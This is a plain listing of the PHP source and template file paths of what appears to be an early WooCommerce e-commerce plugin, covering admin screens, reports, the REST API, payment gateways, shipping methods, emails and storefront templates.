includes/admin/post-types/class-wc-admin-cpt-shop_coupon.php
includes/admin/post-types/class-wc-admin-cpt-shop_order.php
includes/admin/post-types/class-wc-admin-cpt.php
includes/admin/post-types/class-wc-admin-meta-boxes.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-coupon-data.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-actions.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-data.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-downloads.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-items.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-notes.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-reviews.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-order-totals.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-product-data.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-product-images.php
includes/admin/post-types/meta-boxes/class-wc-meta-box-product-short-description.php
includes/admin/post-types/meta-boxes/views/html-order-download-permission.php
includes/admin/post-types/meta-boxes/views/html-order-fee.php
includes/admin/post-types/meta-boxes/views/html-order-item.php
includes/admin/post-types/meta-boxes/views/html-order-shipping.php
includes/admin/post-types/meta-boxes/views/html-order-tax.php
includes/admin/post-types/meta-boxes/views/html-product-download.php
includes/admin/post-types/meta-boxes/views/html-product-variation-download.php
includes/admin/post-types/meta-boxes/views/html-variation-admin.php
includes/admin/reports/class-wc-admin-report.php
includes/admin/reports/class-wc-report-coupon-usage.php
includes/admin/reports/class-wc-report-customer-list.php
includes/admin/reports/class-wc-report-customers.php
includes/admin/reports/class-wc-report-low-in-stock.php
includes/admin/reports/class-wc-report-most-stocked.php
includes/admin/reports/class-wc-report-out-of-stock.php
includes/admin/reports/class-wc-report-sales-by-category.php
includes/admin/reports/class-wc-report-sales-by-date.php
includes/admin/reports/class-wc-report-sales-by-product.php
includes/admin/reports/class-wc-report-stock.php
includes/admin/reports/class-wc-report-taxes-by-code.php
includes/admin/reports/class-wc-report-taxes-by-date.php
includes/admin/settings/class-wc-settings-accounts.php
includes/admin/settings/class-wc-settings-checkout.php
includes/admin/settings/class-wc-settings-emails.php
includes/admin/settings/class-wc-settings-general.php
includes/admin/settings/class-wc-settings-integrations.php
includes/admin/settings/class-wc-settings-page.php
includes/admin/settings/class-wc-settings-products.php
includes/admin/settings/class-wc-settings-shipping.php
includes/admin/settings/class-wc-settings-tax.php
includes/admin/views/html-admin-page-addons.php
includes/admin/views/html-admin-page-reports.php
includes/admin/views/html-admin-page-status-report.php
includes/admin/views/html-admin-page-status-tools.php
includes/admin/views/html-admin-page-status.php
includes/admin/views/html-admin-settings.php
includes/admin/views/html-bulk-edit-product.php
includes/admin/views/html-email-template-preview.php
includes/admin/views/html-notice-install.php
includes/admin/views/html-notice-template-check.php
includes/admin/views/html-notice-theme-support.php
includes/admin/views/html-notice-update.php
includes/admin/views/html-quick-edit-product.php
includes/admin/views/html-report-by-date.php
includes/admin/wc-admin-functions.php
includes/admin/wc-meta-box-functions.php
includes/api/class-wc-api-authentication.php
includes/api/class-wc-api-coupons.php
includes/api/class-wc-api-customers.php
includes/api/class-wc-api-json-handler.php
includes/api/class-wc-api-orders.php
includes/api/class-wc-api-products.php
includes/api/class-wc-api-reports.php
includes/api/class-wc-api-resource.php
includes/api/class-wc-api-server.php
includes/api/class-wc-api-xml-handler.php
includes/api/interface-wc-api-handler.php
includes/class-wc-ajax.php
includes/class-wc-api.php
includes/class-wc-cache-helper.php
includes/class-wc-cart.php
includes/class-wc-checkout.php
includes/class-wc-comments.php
includes/class-wc-countries.php
includes/class-wc-coupon.php
includes/class-wc-customer.php
includes/class-wc-download-handler.php
includes/class-wc-emails.php
includes/class-wc-form-handler.php
includes/class-wc-frontend-scripts.php
includes/class-wc-https.php
includes/class-wc-install.php
includes/class-wc-integrations.php
includes/class-wc-logger.php
includes/class-wc-order-item-meta.php
includes/class-wc-order.php
includes/class-wc-payment-gateways.php
includes/class-wc-post-data.php
includes/class-wc-post-types.php
includes/class-wc-product-external.php
includes/class-wc-product-factory.php
includes/class-wc-product-grouped.php
includes/class-wc-product-simple.php
includes/class-wc-product-variable.php
includes/class-wc-product-variation.php
includes/class-wc-query.php
includes/class-wc-session-handler.php
includes/class-wc-shipping-rate.php
includes/class-wc-shipping.php
includes/class-wc-shortcodes.php
includes/class-wc-tax.php
includes/class-wc-template-loader.php
includes/class-wc-validation.php
includes/emails/class-wc-email-customer-completed-order.php
includes/emails/class-wc-email-customer-invoice.php
includes/emails/class-wc-email-customer-new-account.php
includes/emails/class-wc-email-customer-note.php
includes/emails/class-wc-email-customer-processing-order.php
includes/emails/class-wc-email-customer-reset-password.php
includes/emails/class-wc-email-new-order.php
includes/gateways/bacs/class-wc-gateway-bacs.php
includes/gateways/cheque/class-wc-gateway-cheque.php
includes/gateways/cod/class-wc-gateway-cod.php
includes/gateways/mijireh/class-wc-gateway-mijireh.php
includes/gateways/mijireh/includes/Address.php
includes/gateways/mijireh/includes/Item.php
includes/gateways/mijireh/includes/Mijireh.php
includes/gateways/mijireh/includes/Model.php
includes/gateways/mijireh/includes/Order.php
includes/gateways/mijireh/includes/Rest.php
includes/gateways/mijireh/includes/RestJSON.php
includes/gateways/paypal/class-wc-gateway-paypal.php
includes/libraries/class-cssmin.php
includes/libraries/class-lessc.php
includes/shipping/flat-rate/class-wc-shipping-flat-rate.php
includes/shipping/free-shipping/class-wc-shipping-free-shipping.php
includes/shipping/international-delivery/class-wc-shipping-international-delivery.php
includes/shipping/local-delivery/class-wc-shipping-local-delivery.php
includes/shipping/local-pickup/class-wc-shipping-local-pickup.php
includes/shortcodes/class-wc-shortcode-cart.php
includes/shortcodes/class-wc-shortcode-checkout.php
includes/shortcodes/class-wc-shortcode-my-account.php
includes/shortcodes/class-wc-shortcode-order-tracking.php
includes/updates/woocommerce-update-1.4.php
includes/updates/woocommerce-update-1.5.php
includes/updates/woocommerce-update-2.0.9.php
includes/updates/woocommerce-update-2.0.php
includes/updates/woocommerce-update-2.1.php
includes/walkers/class-product-cat-dropdown-walker.php
includes/walkers/class-product-cat-list-walker.php
includes/wc-attribute-functions.php
includes/wc-cart-functions.php
includes/wc-conditional-functions.php
includes/wc-core-functions.php
includes/wc-coupon-functions.php
includes/wc-customer-functions.php
includes/wc-deprecated-functions.php
includes/wc-formatting-functions.php
includes/wc-notice-functions.php
includes/wc-order-functions.php
includes/wc-page-functions.php
includes/wc-product-functions.php
includes/wc-template-functions.php
includes/wc-template-hooks.php
includes/wc-term-functions.php
includes/widgets/class-wc-widget-cart.php
includes/widgets/class-wc-widget-layered-nav-filters.php
includes/widgets/class-wc-widget-layered-nav.php
includes/widgets/class-wc-widget-price-filter.php
includes/widgets/class-wc-widget-product-categories.php
includes/widgets/class-wc-widget-product-search.php
includes/widgets/class-wc-widget-product-tag-cloud.php
includes/widgets/class-wc-widget-products.php
includes/widgets/class-wc-widget-recent-reviews.php
includes/widgets/class-wc-widget-recently-viewed.php
includes/widgets/class-wc-widget-top-rated-products.php
templates/archive-product.php
templates/cart/cart-empty.php
templates/cart/cart-item-data.php
templates/cart/cart-shipping.php
templates/cart/cart-totals.php
templates/cart/cart.php
templates/cart/cross-sells.php
templates/cart/mini-cart.php
templates/cart/shipping-calculator.php
templates/checkout/cart-errors.php
templates/checkout/form-billing.php
templates/checkout/form-checkout.php
templates/checkout/form-coupon.php
templates/checkout/form-login.php
templates/checkout/form-pay.php
templates/checkout/form-shipping.php
templates/checkout/review-order.php
templates/checkout/thankyou.php
templates/content-product.php
templates/content-product_cat.php
templates/content-single-product.php
templates/content-widget-product.php
templates/emails/admin-new-order.php
templates/emails/customer-completed-order.php
templates/emails/customer-invoice.php
templates/emails/customer-new-account.php
templates/emails/customer-note.php
templates/emails/customer-processing-order.php
templates/emails/customer-reset-password.php
templates/emails/email-addresses.php
templates/emails/email-footer.php
templates/emails/email-header.php
templates/emails/email-order-items.php
templates/emails/plain/admin-new-order.php
templates/emails/plain/customer-completed-order.php
templates/emails/plain/customer-invoice.php
templates/emails/plain/customer-new-account.php
templates/emails/plain/customer-note.php
templates/emails/plain/customer-processing-order.php
templates/emails/plain/customer-reset-password.php
templates/emails/plain/email-addresses.php
templates/emails/plain/email-order-items.php
templates/global/breadcrumb.php
templates/global/form-login.php
templates/global/quantity-input.php
templates/global/sidebar.php
templates/global/wrapper-end.php
templates/global/wrapper-start.php
templates/loop/add-to-cart.php
templates/loop/loop-end.php
templates/loop/loop-start.php
templates/loop/no-products-found.php
templates/loop/orderby.php
templates/loop/pagination.php
templates/loop/price.php
templates/loop/rating.php
templates/loop/result-count.php
templates/loop/sale-flash.php
templates/myaccount/form-add-payment-method.php
templates/myaccount/form-change-password.php
templates/myaccount/form-edit-account.php
templates/myaccount/form-edit-address.php
templates/myaccount/form-login.php
templates/myaccount/form-lost-password.php
templates/myaccount/my-account.php
templates/myaccount/my-address.php
templates/myaccount/my-downloads.php
templates/myaccount/my-orders.php
templates/myaccount/view-order.php
templates/notices/error.php
templates/notices/notice.php
templates/notices/success.php
templates/order/form-tracking.php
templates/order/order-details.php
templates/order/tracking.php
templates/single-product-reviews.php
templates/single-product.php
templates/single-product/add-to-cart/external.php
templates/single-product/add-to-cart/grouped.php
templates/single-product/add-to-cart/simple.php
templates/single-product/add-to-cart/variable.php
templates/single-product/meta.php
templates/single-product/price.php
templates/single-product/product-attributes.php
templates/single-product/product-image.php
templates/single-product/product-thumbnails.php
templates/single-product/rating.php
templates/single-product/related.php
templates/single-product/review.php
templates/single-product/sale-flash.php
templates/single-product/share.php
templates/single-product/short-description.php
templates/single-product/tabs/additional-information.php
templates/single-product/tabs/description.php
templates/single-product/tabs/tabs.php
templates/single-product/title.php
templates/single-product/up-sells.php
templates/taxonomy-product_cat.php
templates/taxonomy-product_tag.php
uninstall.php
woocommerce.php
